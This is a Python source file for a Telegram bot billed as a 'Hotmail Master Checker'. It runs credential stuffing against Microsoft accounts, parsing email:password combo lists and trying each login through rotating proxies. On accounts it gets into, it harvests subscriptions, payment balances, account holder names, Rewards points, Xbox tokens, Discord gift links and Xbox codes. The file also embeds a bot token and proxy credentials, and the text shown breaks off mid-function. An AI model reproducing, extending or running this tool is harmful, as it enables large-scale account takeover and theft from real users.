#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════╗
║          𝐇𝐨𝐭𝐦𝐚𝐢𝐥 𝐌𝐚𝐬𝐭𝐞𝐫 𝐂𝐡𝐞𝐜𝐤𝐞𝐫 𝐁𝐨𝐭                    ║
║          𝐃𝐞𝐯: @BaignX                                    ║
╚══════════════════════════════════════════════════════════╝
"""

import telebot
from telebot import types
import requests
import re
import json
import uuid
import os
import sys
import time
import random
import threading
import shutil
import zipfile
import tempfile
import traceback
import io
from datetime import datetime, timezone, timedelta
from urllib.parse import quote, unquote
from concurrent.futures import ThreadPoolExecutor, as_completed, Future
from copy import deepcopy

try:
    from bs4 import BeautifulSoup
except ImportError:
    os.system(f"{sys.executable} -m pip install beautifulsoup4 -q")
    from bs4 import BeautifulSoup

# Xbox Pulled (fetch + validate from api_exam)
try:
    from api_exam import (
        fetch_oauth_tokens,
        fetch_login,
        get_xbox_tokens,
        fetch_codes_from_xbox,
        login_microsoft_account as xbox_pulled_login,
        validate_code_primary as xbox_pulled_validate,
    )
    XBOX_PULLED_AVAILABLE = True
except ImportError:
    XBOX_PULLED_AVAILABLE = False

# ══════════════════════════════════════════════════════════
#  CONFIG
# ══════════════════════════════════════════════════════════

BOT_TOKEN = "8778892251:AAEvOkfeGplmAkXFnlC3tHRrx54e1RvQeDY"
ADMIN_ID = 7265489223
DEFAULT_THREADS = 30
MAX_LINES = 10000
MAX_FILE_SIZE_MB = 20
DB_FILE = "bot_database.json"
PROXIES_FILE = "proxies.txt"
BACKUP_INTERVAL = 86400  # 24 hours
BOT_START_TIME = time.time()

# ══════════════════════���═══════════════════════════════════
#  BUILTIN PROXIES
# ══════════════════════════════════════════════════════════

BUILTIN_PROXIES = [
    "895803e88e09d774.fjt.na.novada.pro:7777:novada194rkD_76nJGA-zone-res:lXm7rbh22AjU",
    "87.248.148.1:3128:sub_crypto_1t4by0jb4g9i6pkhqvtmzyhv:stat382",
    "87.248.148.166:3128:sub_crypto_1t4by0jb4g9i6pkhqvtmzyhv:stat382",
    "31.193.191.114:3128:sub_crypto_1t4by0jb4g9i6pkhqvtmzyhv:stat382",
    "31.193.191.115:3128:sub_crypto_1t4by0jb4g9i6pkhqvtmzyhv:stat382",
    "31.193.191.116:3128:sub_crypto_1t4by0jb4g9i6pkhqvtmzyhv:stat382",
    "193.36.187.169:3128:sub_crypto_1t4by0jb4g9i6pkhqvtmzyhv:stat382",
    "193.36.187.170:3128:sub_crypto_1t4by0jb4g9i6pkhqvtmzyhv:stat382",
    "193.36.187.171:3128:sub_crypto_1t4by0jb4g9i6pkhqvtmzyhv:stat382",
    "87.248.148.2:3128:sub_crypto_1t4by0jb4g9i6pkhqvtmzyhv:stat382",
]

MAX_RETRIES = 4
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

PROXY_EXC = (
    requests.exceptions.ProxyError,
    requests.exceptions.Timeout,
    requests.exceptions.SSLError,
    requests.exceptions.ConnectionError,
)

# ══════════════════════════════════════════════════════════
#  TIKTOK USER AGENTS
# ══════════════════════════════════════════════════════════

USER_AGENTS = [
    'Mozilla/5.0 (Linux; Android 10; SM-G970F) AppleWebKit/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
]

# ══════════════════════════════════════════════════════════
#  SPECIAL FONTS / MONO / EMOJI HELPERS
# ══════════════════════════════════════════════════════════

E_CHECK = "\u2705"
E_CROSS = "\u274C"
E_FIRE = "\U0001F525"
E_STAR = "\u2B50"
E_LOCK = "\U0001F512"
E_UNLOCK = "\U0001F513"
E_CHART = "\U0001F4CA"
E_FOLDER = "\U0001F4C1"
E_FILE = "\U0001F4C4"
E_USER = "\U0001F464"
E_CROWN = "\U0001F451"
E_GEAR = "\u2699\uFE0F"
E_ROCKET = "\U0001F680"
E_GLOBE = "\U0001F30D"
E_SHIELD = "\U0001F6E1"
E_BELL = "\U0001F514"
E_STOP = "\U0001F6D1"
E_PLAY = "\u25B6\uFE0F"
E_HOURGLASS = "\u23F3"
E_SPARKLE = "\u2728"
E_DIAMOND = "\U0001F48E"
E_HEART = "\u2764\uFE0F"
E_WAVE = "\U0001F44B"
E_PARTY = "\U0001F389"
E_ROBOT = "\U0001F916"
E_MONEY = "\U0001F4B0"
E_GAME = "\U0001F3AE"
E_MUSIC = "\U0001F3B5"
E_WARN = "\u26A0\uFE0F"
E_BAN = "\U0001F6AB"
E_PIN = "\U0001F4CC"
E_LINK = "\U0001F517"
E_BOLT = "\u26A1"
E_GIFT = "\U0001F381"
E_KEY = "\U0001F511"
E_MEMO = "\U0001F4DD"
E_BOOM = "\U0001F4A5"
E_CAMERA = "\U0001F4F7"
E_COOL = "\U0001F60E"
E_THUMB = "\U0001F44D"
E_EYES = "\U0001F440"
E_CLOCK = "\U0001F552"
E_GREEN = "\U0001F7E2"
E_RED = "\U0001F534"
E_YELLOW = "\U0001F7E1"
E_BLUE = "\U0001F535"
E_PURPLE = "\U0001F7E3"
E_ORANGE = "\U0001F7E0"


def mono(text):
    return f"<code>{text}</code>"


def bold(text):
    return f"<b>{text}</b>"


def italic(text):
    return f"<i>{text}</i>"


def uline(text):
    return f"<u>{text}</u>"


def link(text, url):
    return f'<a href="{url}">{text}</a>'


def pre(text):
    return f"<pre>{text}</pre>"


def strike(text):
    return f"<s>{text}</s>"


def make_progress_bar(current, total, length=20):
    if total == 0:
        pct = 0
    else:
        pct = current / total
    filled = int(length * pct)
    bar = "\u2588" * filled + "\u2591" * (length - filled)
    return f"{bar} {pct*100:.1f}%"


# ══════════════════════════════════════════════════════════
#  DATABASE
# ══════════════════════════════════════════════════════════

db_lock = threading.Lock()


def load_db():
    if os.path.exists(DB_FILE):
        try:
            with open(DB_FILE, "r", encoding="utf-8") as f:
                return json.load(f)
        except:
            pass
    return {
        "users": {},
        "banned": {},
        "approved": {},
        "global_stats": {
            "total_checked": 0,
            "total_hits": 0,
            "total_lines_checked": 0
        }
    }


def save_db(db):
    with db_lock:
        with open(DB_FILE, "w", encoding="utf-8") as f:
            json.dump(db, f, indent=2, ensure_ascii=False)


def get_user(db, uid):
    uid = str(uid)
    if uid not in db["users"]:
        db["users"][uid] = {
            "username": "",
            "full_name": "",
            "first_seen": datetime.now().isoformat(),
            "last_seen": datetime.now().isoformat(),
            "total_checked": 0,
            "total_hits": 0,
            "total_lines": 0,
            "checks_count": 0
        }
    db["users"][uid]["last_seen"] = datetime.now().isoformat()
    return db["users"][uid]


def update_user_info(db, user):
    uid = str(user.id)
    u = get_user(db, uid)
    u["username"] = user.username or ""
    fn = user.first_name or ""
    ln = user.last_name or ""
    u["full_name"] = f"{fn} {ln}".strip()
    save_db(db)


def is_banned(db, uid):
    uid = str(uid)
    if uid not in db.get("banned", {}):
        return False, None
    ban = db["banned"][uid]
    if ban.get("days"):
        ban_date = datetime.fromisoformat(ban["date"])
        if datetime.now() > ban_date + timedelta(days=ban["days"]):
            del db["banned"][uid]
            save_db(db)
            return False, None
    return True, ban.get("reason", "No reason")


def is_approved(db, uid):
    uid = str(uid)
    if uid not in db.get("approved", {}):
        return False
    appr = db["approved"][uid]
    if appr.get("days"):
        appr_date = datetime.fromisoformat(appr["date"])
        if datetime.now() > appr_date + timedelta(days=appr["days"]):
            del db["approved"][uid]
            save_db(db)
            return False
    return True


# ══════════════════════════════════════════════════════════
#  PROXY SYSTEM
# ══════════════════════════════════════════════════════════

def load_proxies_from_file():
    proxies = []
    if os.path.exists(PROXIES_FILE):
        with open(PROXIES_FILE, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                line = line.strip()
                if line:
                    proxies.append(line)
    return proxies


def save_proxies_to_file(proxy_list):
    with open(PROXIES_FILE, "w", encoding="utf-8") as f:
        for p in proxy_list:
            f.write(p + "\n")


def init_proxies():
    if not os.path.exists(PROXIES_FILE):
        save_proxies_to_file(BUILTIN_PROXIES)
    return load_proxies_from_file()


class ProxyRotator:
    def __init__(self, plist=None, use=True):
        self.lock = threading.Lock()
        self.use = use
        self.proxies = []
        self.idx = 0
        self.fails = {}
        self.mf = 6
        raw = plist or []
        if use and not raw:
            raw = BUILTIN_PROXIES[:]
        for r in raw:
            p = self._p(r.strip())
            if p:
                self.proxies.append(p)
        if self.proxies:
            random.shuffle(self.proxies)

    def _p(self, r):
        if not r:
            return None
        try:
            if r.count(":") == 3 and "@" not in r:
                parts = r.split(":")
                h, po, u, pw = parts[0], parts[1], parts[2], parts[3]
                url = f"http://{u}:{pw}@{h}:{po}"
                return {"http": url, "https": url, "_r": r}
            if "@" in r:
                return {"http": f"http://{r}", "https": f"http://{r}", "_r": r}
            if r.count(":") == 1:
                return {"http": f"http://{r}", "https": f"http://{r}", "_r": r}
        except:
            pass
        return None

    def get(self):
        if not self.use or not self.proxies:
            return None
        with self.lock:
            for _ in range(len(self.proxies)):
                p = self.proxies[self.idx % len(self.proxies)]
                self.idx += 1
                if self.fails.get(p["_r"], 0) < self.mf:
                    return {"http": p["http"], "https": p["https"]}
            self.fails.clear()
            p = self.proxies[self.idx % len(self.proxies)]
            self.idx += 1
            return {"http": p["http"], "https": p["https"]}

    def ok(self, px):
        if not px:
            return
        with self.lock:
            for p in self.proxies:
                if p["http"] == px.get("http"):
                    self.fails[p["_r"]] = 0
                    break

    def fail(self, px):
        if not px:
            return
        with self.lock:
            for p in self.proxies:
                if p["http"] == px.get("http"):
                    self.fails[p["_r"]] = self.fails.get(p["_r"], 0) + 1
                    break

    def total(self):
        return len(self.proxies)


def test_single_proxy(proxy_str):
    pr = ProxyRotator([proxy_str], True)
    px = pr.get()
    if not px:
        return False
    try:
        r = requests.get("https://httpbin.org/ip", proxies=px, timeout=10)
        return r.status_code == 200
    except:
        return False


# ══════════════════════════════════════════════════════════
#  CHECKER ENGINE (from api_code.py - complete)
# ══════════════════════════════════════════════════════════

SKIP_RE = [
    re.compile(r'^\s*[\u2514\u251C\u2500\u2550\u2554\u255A\u2551\u2557\u255D\u2560\u2563\u2510\u2518\u250C\u252C\u2534\u253C\u2502]'),
    re.compile(r'^\s*\[(?:ACTIVE|PERPETUAL|INFO)\]', re.I),
    re.compile(r'^\s*Generated:', re.I),
    re.compile(r'^\s*Total\s+Hits:', re.I),
    re.compile(r'^\s*={3,}'),
    re.compile(r'^\s*-{3,}'),
    re.compile(r'^\s*#'),
]
EM_RE = re.compile(r'([A-Za-z0-9._%+\-]+@[A-Za-z0-9.\-]+\.[A-Za-z]{2,})')
DISC_RE = re.compile(
    r'https?://(?:discord\.gift|discord\.com/gifts|promos\.discord\.gg|discord\.com/billing/promotions)/([A-Za-z0-9_-]+)',
    re.I)
XCODE_RE = re.compile(r'[A-Z0-9]{5}-[A-Z0-9]{5}-[A-Z0-9]{5}-[A-Z0-9]{5}-[A-Z0-9]{5}')


def parse_combos(lines_list):
    combos = []
    bad = 0
    total = len(lines_list)
    for line in lines_list:
        line = line.strip()
        if not line:
            bad += 1
            continue
        skip = False
        for p in SKIP_RE:
            if p.match(line):
                skip = True
                break
        if skip:
            bad += 1
            continue
        em = EM_RE.search(line)
        if not em:
            bad += 1
            continue
        email = em.group(1)
        rest = line[em.end():]
        rest = re.sub(r'^[\s:;|]+', '', rest)
        parts = re.split(r'\s*\|\s*', rest, 1)
        pwd = parts[0].strip() if parts else ""
        if not pwd or len(pwd) < 3:
            bad += 1
            continue
        combos.append((email, pwd))
    return combos, total, bad


def _clean(url):
    if not url:
        return url
    return url.replace("&amp;", "&").replace("&#x3a;", ":").replace("&#x2f;", "/")


def _dosubmit(t):
    return "DoSubmit" in t or "document.fmHF.submit" in t or ('onload="' in t and 'submit()' in t.lower())


def _form_sub(sess, resp, hops=10):
    c = resp
    for _ in range(hops):
        if not _dosubmit(c.text):
            break
        am = re.search(r'<form[^>]*action="([^"]+)"', c.text, re.I)
        if not am:
            break
        act = _clean(am.group(1))
        fd = {}
        for n, v in re.findall(r'<input[^>]*name="([^"]*)"[^>]*value="([^"]*)"', c.text):
            fd[n] = _clean(v)
        for v, n in re.findall(r'<input[^>]*value="([^"]*)"[^>]*name="([^"]*)"', c.text):
            if n not in fd:
                fd[n] = _clean(v)
        mm = re.search(r'<form[^>]*method="([^"]+)"', c.text, re.I)
        meth = mm.group(1).upper() if mm else "POST"
        h = {"User-Agent": UA, "Content-Type": "application/x-www-form-urlencoded",
             "Accept": "text/html,*/*", "Referer": c.url}
        if meth == "GET":
            c = sess.get(act, params=fd, headers=h, allow_redirects=True, timeout=15)
        else:
            c = sess.post(act, data=fd, headers=h, allow_redirects=True, timeout=15)
    return c


def _issue(url, text=""):
    c = (_clean(url) + " " + text).lower() if url else text.lower()
    if "account.live.com/recover" in c:
        return "2FA"
    if "account.live.com/abuse" in c or "/abuse?mkt=" in c:
        return "2FA"
    if "identity/confirm" in c:
        return "2FA"
    if "account or password is incorrect" in c or "that password is incorrect" in c:
        return "BAD"
    if "account doesn" in c:
        return "BAD"
    if "account has been locked" in c or "account has been suspended" in c:
        return "2FA"
    if "cancel?mkt=" in c:
        return "2FA"
    return None


def _follow(sess, resp, hops=12):
    c = resp
    bh = {"User-Agent": UA, "Accept": "text/html,*/*"}
    for _ in range(hops):
        iss = _issue(c.url, c.text)
        if iss:
            return c
        if _dosubmit(c.text):
            c = _form_sub(sess, c)
            continue
        m = re.search(r'<meta[^>]*http-equiv="refresh"[^>]*content="[^;]*;\s*([^"]+)"', c.text, re.I)
        if m:
            bh["Referer"] = c.url
            try:
                c = sess.get(_clean(m.group(1).strip()), headers=bh, allow_redirects=True, timeout=15)
            except:
                break
            continue
        found = False
        for p in [r'window\.location\.replace\("([^"]+)"\)', r'window\.location\.href\s*=\s*"([^"]+)"']:
            m2 = re.search(p, c.text)
            if m2:
                bh["Referer"] = c.url
                try:
                    c = sess.get(_clean(m2.group(1)), headers=bh, allow_redirects=True, timeout=15)
                except:
                    pass
                found = True
                break
        if not found:
            break
    return c


def ms_login(email, pwd, pxr_inst):
    sess = requests.Session()
    px = pxr_inst.get() if pxr_inst else None
    if px:
        sess.proxies = px
    try:
        r1 = sess.get(
            "https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress=" + email,
            headers={"User-Agent": "Dalvik/2.1.0", "X-CorrelationId": str(uuid.uuid4())}, timeout=12)
        if r1.status_code != 200:
            return sess, "ERROR", None, None
        if any(x in r1.text for x in ["Neither", "Both", "Placeholder", "OrgId"]):
            return sess, "BAD", None, None
        if "MSAccount" not in r1.text:
            return sess, "BAD", None, None

        r2 = sess.get(
            "https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize"
            "?client_info=1&haschrome=1&login_hint=" + email +
            "&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59"
            "&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
            "&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D",
            headers={"User-Agent": UA}, allow_redirects=True, timeout=12)
        um = re.search(r'urlPost":"([^"]+)"', r2.text)
        pm = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)
        if not um or not pm:
            return sess, "ERROR", None, None
        post_url = _clean(um.group(1).replace("\\/", "/"))
        ppft = pm.group(1)

        r3 = sess.post(post_url,
                        data=("i13=1&login=" + email + "&loginfmt=" + email +
                              "&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd=" +
                              pwd + "&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx="
                              "&hpgrequestid=&PPFT=" + ppft +
                              "&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0"
                              "&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=9960"),
                        headers={"Content-Type": "application/x-www-form-urlencoded", "User-Agent": UA,
                                 "Origin": "https://login.live.com", "Referer": r2.url},
                        allow_redirects=False, timeout=12)

        loc = _clean(r3.headers.get("Location", ""))
        iss = _issue(loc, r3.text)
        if iss:
            return sess, iss, None, None

        if not loc and _dosubmit(r3.text):
            r3f = _form_sub(sess, r3)
            iss = _issue(r3f.url, r3f.text)
            if iss:
                return sess, iss, None, None
            loc = r3f.url

        if not loc:
            nm = re.search(r'navigate\("([^"]+)"\)', r3.text)
            if nm:
                loc = _clean(nm.group(1))

        code = None
        if loc:
            iss = _issue(loc)
            if iss:
                return sess, iss, None, None
            cm = re.search(r'code=([^&]+)', loc)
            if cm:
                code = cm.group(1)

        if not code:
            return sess, "BAD", None, None

        cid = sess.cookies.get("MSPCID", "")
        if cid:
            cid = cid.upper()

        tr = sess.post(
            "https://login.microsoftonline.com/consumers/oauth2/v2.0/token",
            data=("client_info=1&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59"
                  "&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
                  "&grant_type=authorization_code&code=" + code +
                  "&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"),
            headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=12)

        access_token = None
        if tr.status_code == 200 and "access_token" in tr.text:
            try:
                access_token = tr.json().get("access_token")
            except:
                pass

        if not cid:
            cid = sess.cookies.get("MSPCID", "")
            if cid:
                cid = cid.upper()

        bh = {"User-Agent": UA, "Accept": "text/html,*/*"}
        try:
            _follow(sess, sess.get(
                "https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize"
                "?client_id=81feaced-5ddd-41e7-8bef-3e20a2689bb7"
                "&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-client-signin-oauth"
                "&response_type=code&scope=openid%20profile%20offline_access"
                "&prompt=none&login_hint=" + email,
                headers=bh, allow_redirects=True, timeout=15))
        except:
            pass

        try:
            _follow(sess, sess.get(
                "https://login.live.com/oauth20_authorize.srf"
                "?client_id=0000000044199E82&scope=service::account.microsoft.com::MBI_SSL"
                "&response_type=token&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-signin"
                "&prompt=none&login_hint=" + email,
                headers=bh, allow_redirects=True, timeout=15))
        except:
            pass

        if px:
            pxr_inst.ok(px)
        return sess, "OK", access_token, cid

    except PROXY_EXC:
        if px:
            pxr_inst.fail(px)
        return sess, "ERROR", None, None
    except:
        return sess, "ERROR", None, None


def _extract_svcs(html):
    m = re.search(r'JSON\.stringify\((\{"summaryData":\{"isOperationSuccessful".+?\})\)\s*;', html, re.DOTALL)
    if not m:
        for m2 in re.finditer(r'JSON\.stringify\((\{.+?\})\)\s*[;,]', html, re.DOTALL):
            try:
                o = json.loads(m2.group(1))
                if isinstance(o, dict) and "summaryData" in o:
                    m = m2
                    break
            except:
                pass
    if not m:
        return []
    try:
        data = json.loads(m.group(1))
    except:
        return []
    sm = data.get("summaryData", data)
    svcs = []
    for key, label in [("active", "ACTIVE"), ("trial", "TRIAL"), ("canceled", "CANCELED"),
                       ("commercial", "COMMERCIAL"), ("perpetual", "PERPETUAL"),
                       ("expired", "EXPIRED"), ("pending", "PENDING")]:
        for it in (sm.get(key) or []):
            if not isinstance(it, dict):
                continue
            svcs.append({
                "cat": label,
                "name": it.get("name") or it.get("displayName") or "Unknown",
                "days": None, "auto": None, "expiry": None, "billing": None,
                "bill_curr": None, "trial": bool(it.get("isTrial")),
            })
    return svcs


def _enrich(sess, svcs):
    try:
        r = sess.get("https://account.microsoft.com/services/api/subscriptions",
                      headers={"User-Agent": UA, "Accept": "application/json",
                               "Referer": "https://account.microsoft.com/services"}, timeout=10)
        if r.status_code != 200:
            return svcs
        data = r.json()
        items = data if isinstance(data, list) else None
        if not items and isinstance(data, dict):
            for k in ["subscriptions", "active", "items", "data", "value"]:
                if k in data and isinstance(data[k], list):
                    items = data[k]
                    break
        if not items:
            return svcs

        def scan(obj, keys):
            if isinstance(obj, dict):
                for k in keys:
                    if k in obj and obj[k]:
                        return obj[k]
                for v in obj.values():
                    r2 = scan(v, keys)
                    if r2:
                        return r2
            elif isinstance(obj, list):
                for i in obj:
                    r2 = scan(i, keys)
                    if r2:
                        return r2
            return None

        def pdate(v):
            if not v:
                return None
            s2 = str(v).strip()
            for fmt in ["%Y-%m-%dT%H:%M:%SZ", "%Y-%m-%dT%H:%M:%S.%fZ", "%Y-%m-%dT%H:%M:%S", "%Y-%m-%d"]:
                try:
                    return datetime.strptime(s2[:19], fmt[:len(s2[:19])])
                except:
                    pass
            return None

        for it in items:
            if not isinstance(it, dict):
                continue
            iname = (it.get("name") or it.get("displayName") or "").lower()
            matched = None
            for sv in svcs:
                if sv["name"].lower() in iname or iname in sv["name"].lower():
                    matched = sv
                    break
            if not matched:
                continue
            v = scan(it, ["endDate", "expirationDate", "expiryDate", "subscriptionEndDate"])
            if v:
                dt = pdate(v)
                if dt:
                    matched["expiry"] = dt
                    now = datetime.now(timezone.utc)
                    if dt.tzinfo is None:
                        dt = dt.replace(tzinfo=timezone.utc)
                    matched["days"] = (dt - now).days
            if matched["days"] is None:
                v = scan(it, ["nextBillingDate", "renewalDate", "nextRenewalDate"])
                if v:
                    dt = pdate(v)
                    if dt:
                        now = datetime.now(timezone.utc)
                        if dt.tzinfo is None:
                            dt = dt.replace(tzinfo=timezone.utc)
                        matched["days"] = (dt - now).days
                        matched["expiry"] = dt
            v = scan(it, ["amount", "price", "billingAmount", "totalAmount"])
            if v is not None:
                matched["billing"] = v
            v = scan(it, ["currency", "currencyCode"])
            if v:
                matched["bill_curr"] = v
            v = scan(it, ["autoRenew", "isAutoRenewEnabled"])
            if v is not None:
                matched["auto"] = bool(v)
    except:
        pass
    return svcs


def check_services(sess, email):
    bh = {"User-Agent": UA, "Accept": "text/html,*/*"}
    try:
        r6 = _follow(sess, sess.get(
            "https://account.microsoft.com/services?ref=xboxme",
            headers=bh, allow_redirects=True, timeout=15))
        if "complete-sso" in r6.url:
            sm = re.search(r'complete-sso-with-redirect\?state=[^"\'&\s]+', r6.text)
            if sm:
                r6 = _follow(sess, sess.get(
                    "https://account.microsoft.com/auth/" + sm.group(0),
                    headers=bh, allow_redirects=True, timeout=15))
        if "login" in r6.url.lower() and "account.microsoft.com/services" not in r6.url:
            r6 = _follow(sess, sess.get("https://account.microsoft.com/services",
                                         headers=bh, allow_redirects=True, timeout=15))
        svcs = _extract_svcs(r6.text)
        svcs = _enrich(sess, svcs)
        return svcs
    except:
        return []


def fmt_svc(sv):
    parts = [f"[{sv['cat']}] {sv['name']}"]
    if sv.get("days") is not None:
        parts.append(f"Days: {sv['days']}")
    if sv.get("auto") is not None:
        parts.append(f"AutoRenew: {'YES' if sv['auto'] else 'NO'}")
    if sv.get("expiry"):
        parts.append(f"Expires: {sv['expiry'].strftime('%Y-%m-%d')}")
    if sv.get("billing") is not None:
        b = str(sv["billing"])
        if sv.get("bill_curr"):
            b += f" {sv['bill_curr']}"
        parts.append(f"Billing: {b}")
    return " | ".join(parts)


def classify_svc(name):
    nl = name.lower()
    if "game pass ultimate" in nl:
        return "xgpu"
    if "game pass" in nl and "essential" in nl:
        return "xgpe"
    if "game pass" in nl:
        return "xgpp"
    if "365" in nl or "office" in nl:
        return "m365"
    return "other_svc"


def check_balance(sess):
    try:
        uid = str(uuid.uuid4()).replace('-', '')[:16]
        state = json.dumps({"userId": uid, "scopeSet": "pidl"})
        r = sess.get(
            "https://login.live.com/oauth20_authorize.srf?client_id=000000000004773A"
            "&response_type=token&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete"
            "&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth"
            "&state=" + quote(state) + "&prompt=none",
            headers={"User-Agent": UA, "Referer": "https://account.microsoft.com/"},
            allow_redirects=True, timeout=15)
        tk = None
        for p in [r'access_token=([^&\s"\']+)', r'"access_token":"([^"]+)"']:
            m = re.search(p, r.text + " " + r.url)
            if m:
                tk = unquote(m.group(1))
                break
        if not tk:
            return None, None, None
        rp = sess.get(
            "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US",
            headers={"User-Agent": UA, "Accept": "application/json",
                     "Authorization": f'MSADELEGATE1.0="{tk}"',
                     "Origin": "https://account.microsoft.com"}, timeout=12)
        if rp.status_code != 200:
            return None, None, None
        txt = rp.text
        bal = None
        cur = None
        holder = None
        bm = re.search(r'"balance"\s*:\s*([0-9.]+)', txt)
        if bm:
            bal = float(bm.group(1))
        cm = re.search(r'"currency"\s*:\s*"([^"]+)"', txt)
        if cm:
            cur = cm.group(1)
        hm = re.search(r'"accountHolderName"\s*:\s*"([^"]+)"', txt)
        if hm:
            holder = hm.group(1)
        return bal, cur, holder
    except:
        return None, None, None


def check_rp(sess):
    try:
        bh = {"User-Agent": UA}
        try:
            ra = sess.get(
                "https://login.live.com/oauth20_authorize.srf"
                "?client_id=0000000040170455&scope=service::bing.com::MBI_SSL"
                "&response_type=token"
                "&redirect_uri=https%3A%2F%2Fwww.bing.com%2Ffd%2Fauth%2Fsignin%3Faction%3Dinteractive"
                "&prompt=none", headers=bh, allow_redirects=True, timeout=12)
            if _dosubmit(ra.text):
                _form_sub(sess, ra)
        except:
            pass
        time.sleep(0.3)
        r = sess.get("https://rewards.bing.com/dashboard", headers=bh, allow_redirects=True, timeout=15)
        if _dosubmit(r.text):
            r = _form_sub(sess, r)
        pg = r.text
        pts = None
        for p in [r'"availablePoints"\s*:\s*(\d+)', r'availablePoints["\s:=]+(\d+)',
                  r'"redeemable"\s*:\s*(\d+)']:
            m = re.search(p, pg)
            if m:
                try:
                    pts = int(m.group(1).replace(',', ''))
                    break
                except:
                    pass
        if pts is None:
            try:
                ar = sess.get("https://rewards.bing.com/api/getuserinfo?type=1",
                              headers={"User-Agent": UA, "Referer": "https://rewards.bing.com/dashboard"},
                              timeout=10)
                m = re.search(r'"availablePoints"\s*:\s*(\d+)', ar.text)
                if m:
                    pts = int(m.group(1))
            except:
                pass
        return pts
    except:
        return None


def get_xbl(sess):
    try:
        r = sess.get(
            "https://login.live.com/oauth20_authorize.srf"
            "?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf"
            "&scope=service::user.auth.xboxlive.com::MBI_SSL"
            "&display=touch&response_type=token&locale=en&prompt=none",
            headers={"User-Agent": UA}, allow_redirects=True, timeout=12)
        if _dosubmit(r.text):
            r = _form_sub(sess, r)
        tm = re.search(r'access_token=([^&]+)', r.url)
        if not tm:
            return None
        rps = tm.group(1)
        xh = {"User-Agent": UA, "Content-Type": "application/json", "x-xbl-contract-version": "1"}
        ur = sess.post("https://user.auth.xboxlive.com/user/authenticate", headers=xh,
                       json={"Properties": {"AuthMethod": "RPS", "RpsTicket": rps,
                                            "SiteName": "user.auth.xboxlive.com"},
                             "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"}, timeout=10)
        if ur.status_code != 200:
            return None
        ut = ur.json().get("Token")
        if not ut:
            return None
        xr = sess.post("https://xsts.auth.xboxlive.com/xsts/authorize", headers=xh,
                       json={"Properties": {"SandboxId": "RETAIL", "UserTokens": [ut]},
                             "RelyingParty": "http://xboxlive.com", "TokenType": "JWT"}, timeout=10)
        d = xr.json()
        if "Token" not in d:
            return None
        return f"XBL3.0 x={d['DisplayClaims']['xui'][0]['uhs']};{d['Token']}"
    except:
        return None


def check_discord(sess, xbl, pxr_inst):
    found = []
    if not xbl:
        return found
    ah = {"authorization": xbl, "User-Agent": UA, "Accept": "application/json"}
    for meth, url in [
        ("POST", "https://profile.gamepass.com/v2/offers/A3525E6D4370403B9763BCFA97D383D9/"),
        ("GET", "https://profile.gamepass.com/v1/perks"),
        ("GET", "https://profile.gamepass.com/v2/perks"),
        ("GET", "https://profile.gamepass.com/v1/perks/active"),
    ]:
        try:
            if meth == "GET":
                r = sess.get(url, headers=ah, timeout=12)
            else:
                r = sess.post(url, headers=ah, timeout=12)
            if r and r.status_code == 200:
                for m in DISC_RE.finditer(r.text):
                    lnk = m.group(0)
                    if lnk not in [x[0] for x in found]:
                        found.append((lnk, "FOUND"))
        except:
            pass
    return found


def disc_status(link, pxr_inst):
    try:
        m = re.search(r'/([A-Za-z0-9_-]+)$', link)
        if not m:
            return "UNK"
        px = pxr_inst.get() if pxr_inst else None
        r = requests.get(f"https://discord.com/api/v10/entitlements/gift-codes/{m.group(1)}",
                         headers={"User-Agent": UA}, proxies=px or {}, timeout=10)
        if r.status_code == 200:
            d = r.json()
            if d.get("uses", 0) >= d.get("max_uses", 1) or d.get("redeemed"):
                return "CLAIMED"
            return "VALID"
        return "UNK"
    except:
        return "UNK"


def check_xbox_codes(sess):
    codes = []
    try:
        bh = {"User-Agent": UA, "Referer": "https://rewards.bing.com/"}
        r = sess.get("https://rewards.bing.com/redeem/orderhistory", headers=bh,
                     allow_redirects=True, timeout=15)
        if _dosubmit(r.text):
            r = _form_sub(sess, r)
            r = sess.get("https://rewards.bing.com/redeem/orderhistory", headers=bh,
                         allow_redirects=True, timeout=15)
        soup = BeautifulSoup(r.text, 'html.parser')
        vt = ""
        ti = soup.find('input', attrs={'name': '__RequestVerificationToken'})
        if ti and ti.get('value'):
            vt = ti['value']
        table = soup.find('table', class_='table')
        if not table:
            return codes
        for row in table.find_all('tr'):
            cells = row.find_all(['td', 'th'])
            if len(cells) < 3:
                continue
            btn = row.find('button', id=lambda x: x and x.startswith('OrderDetails_'))
            if not btn:
                continue
